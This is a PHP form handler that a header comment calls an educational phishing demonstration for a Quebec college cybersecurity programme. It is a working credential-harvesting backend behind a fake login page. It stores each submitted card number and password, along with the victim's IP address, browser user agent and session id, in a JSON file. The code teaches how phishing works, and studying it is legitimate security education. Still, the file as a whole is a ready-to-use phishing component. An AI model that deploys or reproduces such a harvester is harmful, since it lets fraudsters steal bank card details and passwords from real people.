<!--
* Educational Phishing Demonstration
* ----------------------------------------
* Programme: AEC Cybersécurité : protection et défense
* 
* Author/Professor: Akram Nasr
* Email: Akram.Nasr@cmontmorency.qc.ca
* 
* IMPORTANT NOTICE:
* This code is created for EDUCATIONAL PURPOSES ONLY to demonstrate 
* phishing techniques and security vulnerabilities as part of 
* cybersecurity education. Using this code for actual phishing
* or any malicious purpose is illegal and unethical.
-->

<?php
// process_form.php

session_start(); // Start the session to ensure a session id exists.

// Only run if the form is submitted
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Retrieve form data (using the name attributes from the original HTML)
    $cardNumber = $_POST['username-input'] ?? '';
    $password   = $_POST['password-input'] ?? '';

    // Additional information (current date/time, IP, user agent)
    $date      = date('Y-m-d H:i:s');
    $ipAddress = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';

    // Retrieve the session id for mapping
    $sessionId = session_id();

    // Prepare the entry as an associative array (including session_id)
    $entry = [
        'card_number' => $cardNumber,
        'password'    => $password,
        'date'        => $date,
        'ip'          => $ipAddress,
        'user_agent'  => $userAgent,
        'session_id'  => $sessionId
    ];

    // Define the JSON file path for card details
    $jsonFile = 'data/cards.json';
    $currentData = [];

    // Load current JSON data if file exists
    if (file_exists($jsonFile)) {
        $jsonStr = file_get_contents($jsonFile);
        $currentData = json_decode($jsonStr, true) ?? [];
    }

    // Append the new entry
    $currentData[] = $entry;

    // Write the updated array back to the JSON file (with pretty printing)
    file_put_contents($jsonFile, json_encode($currentData, JSON_PRETTY_PRINT));

    // Set a flag to indicate the form has been processed
    $formSubmitted = true;
}
?>
